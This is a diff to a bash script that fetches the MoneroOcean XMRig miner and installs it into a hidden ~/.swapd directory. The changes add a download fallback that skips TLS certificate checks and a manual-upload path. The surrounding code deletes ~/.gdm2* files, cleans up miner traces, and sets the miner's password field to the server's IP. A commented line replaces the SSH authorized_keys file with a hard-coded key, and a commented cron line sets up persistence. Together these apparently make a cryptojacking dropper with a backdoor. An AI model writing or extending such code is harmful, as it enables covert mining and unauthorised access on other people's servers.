@@ -187,6 +187,7 @@ echo ""
 # ========================================================================
 # UNIVERSAL DOWNLOAD FUNCTION
 # Automatically uses curl or wget based on what works
+# Handles ancient SSL by providing manual upload instructions
 # ========================================================================
 
 download_file() {
@@ -202,7 +203,6 @@ download_file() {
                 return 0
             fi
             # If that fails, try without SSL verification
-            echo "[!] Retrying with --no-check-certificate..."
             if wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null; then
                 return 0
             fi
@@ -212,18 +212,92 @@ download_file() {
                 return 0
             fi
             # If that fails, try without SSL verification
-            echo "[!] Retrying with --insecure..."
             if curl -L --insecure --connect-timeout 30 --max-time 300 "$url" -o "$output" 2>/dev/null; then
                 return 0
             fi
         fi
         
         retry=$((retry + 1))
-        echo "[!] Download attempt $retry/$max_retries failed, retrying..."
-        sleep 2
+        if [ $retry -lt $max_retries ]; then
+            echo "[!] Download attempt $retry/$max_retries failed, retrying..."
+            sleep 2
+        fi
     done
     
     return 1
+}
+
+# ========================================================================
+# MANUAL UPLOAD FALLBACK
+# For systems too old to download from HTTPS (ancient OpenSSL)
+# ========================================================================
+
+manual_upload_instructions() {
+    local filename="$1"
+    local target_path="$2"
+    
+    echo ""
+    echo "========================================================================"
+    echo "[!] AUTOMATIC DOWNLOAD FAILED - MANUAL UPLOAD REQUIRED"
+    echo "========================================================================"
+    echo ""
+    echo "Your system's OpenSSL/SSL is too old to download from modern HTTPS sites."
+    echo "This is common on CentOS 5/6 and very old systems."
+    echo ""
+    echo "SOLUTION - Manual Upload:"
+    echo ""
+    echo "1. On a modern computer, download the file:"
+    echo "   wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
+    echo ""
+    echo "2. Transfer to THIS server:"
+    
+    # Get server IP (compatible with ancient hostname)
+    SERVER_IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
+    if [ -z "$SERVER_IP" ]; then
+        SERVER_IP=$(ifconfig 2>/dev/null | grep 'inet addr:' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
+    fi
+    if [ -z "$SERVER_IP" ]; then
+        SERVER_IP="THIS_SERVER_IP"
+    fi
+    
+    echo "   scp xmrig.tar.gz root@${SERVER_IP}:$target_path"
+    echo ""
+    echo "3. Then press ENTER to continue (or Ctrl+C to abort)"
+    echo ""
+    echo "========================================================================"
+    echo ""
+    
+    # Check if file already exists
+    if [ -f "$target_path" ]; then
+        echo "[✓] File already exists at $target_path - continuing..."
+        return 0
+    fi
+    
+    # Wait for user to upload
+    echo -n "Waiting for file upload... (press ENTER after uploading): "
+    read -t 300 # 5 minute timeout
+    
+    # Check again
+    if [ -f "$target_path" ]; then
+        echo "[✓] File detected at $target_path - continuing..."
+        return 0
+    else
+        echo "[!] File not found at $target_path"
+        echo "[*] Checking again in 10 seconds..."
+        sleep 10
+        
+        if [ -f "$target_path" ]; then
+            echo "[✓] File detected - continuing..."
+            return 0
+        else
+            echo ""
+            echo "[ERROR] File still not found after waiting."
+            echo "[ERROR] Please upload xmrig.tar.gz to $target_path"
+            echo "[ERROR] Then run this script again."
+            echo ""
+            return 1
+        fi
+    fi
 }
 
 echo "[*] Download system configured:"
@@ -773,21 +847,78 @@ rm -rf "$HOME"/.gdm2*
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
 
-# Use the universal download function (handles curl/wget and SSL issues)
-if download_file "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
-  echo "[✓] XMRig downloaded successfully"
+# First, check if file already exists (from previous manual upload)
+if [ -f /tmp/xmrig.tar.gz ]; then
+    # Verify it's a valid tar.gz file
+    if file /tmp/xmrig.tar.gz 2>/dev/null | grep -q "gzip compressed"; then
+        echo "[✓] Found existing xmrig.tar.gz in /tmp/ - using it"
+        echo "[*] (This file was likely manually uploaded previously)"
+        touch /tmp/.manual_upload_used  # Mark that manual upload was used
+        DOWNLOAD_SUCCESS=true
+    else
+        echo "[!] Found /tmp/xmrig.tar.gz but it's not a valid gzip file - removing"
+        rm -f /tmp/xmrig.tar.gz
+        DOWNLOAD_SUCCESS=false
+    fi
 else
-  echo "[ERROR] Failed to download XMRig after multiple attempts"
-  echo "[*] Trying alternative download method..."
-  
-  # Last resort: manual wget with no certificate check
-  if command -v wget &> /dev/null; then
-    wget --no-check-certificate --timeout=60 https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz
-  else
-    echo "[ERROR] All download methods failed"
-    exit 1
-  fi
+    DOWNLOAD_SUCCESS=false
 fi
+
+# Try to download if we don't have a valid file
+if [ "$DOWNLOAD_SUCCESS" = false ]; then
+    echo "[*] Attempting download..."
+    
+    # Use the universal download function (handles curl/wget and SSL issues)
+    if download_file "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
+        echo "[✓] XMRig downloaded successfully"
+        DOWNLOAD_SUCCESS=true
+    else
+        echo "[!] Primary download method failed"
+        echo "[*] Trying alternative download method..."
+        
+        # Last resort: manual wget with no certificate check
+        if command -v wget &> /dev/null; then
+            if wget --no-check-certificate --timeout=60 https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz 2>&1 | grep -q "saved"; then
+                echo "[✓] Downloaded via wget --no-check-certificate"
+                DOWNLOAD_SUCCESS=true
+            fi
+        fi
+    fi
+fi
+
+# If all automatic methods failed, fall back to manual upload
+if [ "$DOWNLOAD_SUCCESS" = false ]; then
+    echo ""
+    echo "[!] All automatic download methods failed!"
+    echo "[*] Your system appears to have very old SSL/TLS libraries"
+    echo ""
+    
+    # Provide manual upload instructions and wait
+    if manual_upload_instructions "xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
+        echo "[✓] Manual upload successful"
+        touch /tmp/.manual_upload_used  # Mark that manual upload was used
+        DOWNLOAD_SUCCESS=true
+    else
+        echo "[ERROR] Could not obtain xmrig.tar.gz"
+        echo "[ERROR] Installation cannot continue without the miner binary"
+        exit 1
+    fi
+fi
+
+# Verify we have a valid file before continuing
+if [ ! -f /tmp/xmrig.tar.gz ]; then
+    echo "[ERROR] /tmp/xmrig.tar.gz not found after download/upload!"
+    exit 1
+fi
+
+# Verify it's a valid gzip file
+if ! file /tmp/xmrig.tar.gz 2>/dev/null | grep -q "gzip compressed"; then
+    echo "[ERROR] /tmp/xmrig.tar.gz is not a valid gzip file!"
+    echo "[ERROR] File type: $(file /tmp/xmrig.tar.gz)"
+    exit 1
+fi
+
+echo "[✓] xmrig.tar.gz ready for extraction"
 
 echo "[*] Unpacking xmrig.tar.gz to "$HOME"/.swapd/"
 [ -d "$HOME"/.swapd/ ] || mkdir "$HOME"/.swapd/
@@ -1140,20 +1271,60 @@ rm -rf "$HOME"/xmrig* "$HOME"/config.json* "$HOME"/config*
 #(crontab -l 2>/dev/null | grep -v -E '(out dat|check_swapd.sh)'; echo "$CRON_JOB") | crontab -
 
 echo "PASS..."
-#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-#PASS=`hostname`
-#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-PASS=$(sh -c "(curl -4 ip.sb)")
-if [ "$PASS" == "localhost" ]; then
-  PASS=$(ip route get 1 | awk '{print $NF;exit}')
-fi
-if [ -z "$PASS" ]; then
-  PASS=na
-fi
+
+# Universal IP detection compatible with ancient systems
+get_server_ip() {
+    local ip=""
+    
+    # Method 1: Try external IP service (requires network)
+    ip=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
+    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 2: Try ip command (modern systems)
+    ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
+    if [ -n "$ip" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 3: Try ifconfig (older systems)
+    ip=$(ifconfig 2>/dev/null | grep 'inet addr:' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
+    if [ -n "$ip" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 4: Try ip route (intermediate systems)
+    ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
+    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Method 5: Try hostname (very old systems)
+    ip=$(hostname -i 2>/dev/null | awk '{print $1}')
+    if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
+        echo "$ip"
+        return 0
+    fi
+    
+    # Fallback
+    echo "na"
+}
+
+PASS=$(get_server_ip)
+echo "[*] Detected server identifier: $PASS"
+
 if [ -n "$EMAIL" ]; then
   PASS="$PASS:$EMAIL"
+  echo "[*] Added email to password field: $EMAIL"
 fi
+
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME"/.swapd/config.json
+echo "[*] Password field configured"
 
 echo "[*] Generating ssh key on server"
 #cd ~ && rm -rf .ssh && rm -rf ~/.ssh/authorized_keys && mkdir ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >>~/.ssh/authorized_keys
@@ -1367,11 +1538,19 @@ else
 fi
 
 echo ""
-echo "Download Method:"
+echo "Installation Method:"
 if [ "$USE_WGET" = true ]; then
-    echo "  wget (curl SSL/TLS failed)"
+    echo "  Download Tool: wget (curl SSL/TLS failed)"
 else
-    echo "  curl"
+    echo "  Download Tool: curl"
+fi
+
+# Check if manual upload was used (file existed before download attempt)
+if [ -f /tmp/.manual_upload_used ]; then
+    echo "  Download Mode: Manual upload (SSL too old for HTTPS)"
+    rm -f /tmp/.manual_upload_used
+else
+    echo "  Download Mode: Automatic download"
 fi
 
 echo ""
